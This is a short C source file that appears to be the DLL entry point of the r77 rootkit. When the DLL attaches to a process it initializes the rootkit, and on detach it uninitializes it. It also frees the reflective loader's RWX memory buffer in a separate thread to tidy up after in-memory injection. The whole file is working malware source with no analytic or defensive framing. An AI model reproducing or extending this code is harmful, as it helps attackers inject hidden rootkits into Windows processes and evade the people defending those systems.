#include "r77mindef.h"
#include "Rootkit.h"
#include "ReflectiveDllMain.h"

static DWORD WINAPI FreeReflectiveLoader(LPVOID parameter)
{
	Sleep(100);
	VirtualFree(parameter, 0, MEM_RELEASE);
}

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		if (!InitializeRootkit())
		{
			// If the rootkit could not initialize, is already injected, or not eligible for this process, detach the DLL.
			return FALSE;
		}

		// "reserved" is the dllBase of the reflective loader.
		// After ReflectiveMain returned, this buffer should be freed, because it is an RWX buffer that is no longer needed.
		CreateThread(NULL, 0, FreeReflectiveLoader, reserved, 0, NULL);
	}
	else if (reason == DLL_PROCESS_DETACH)
	{
		UninitializeRootkit();
	}

	return TRUE;
}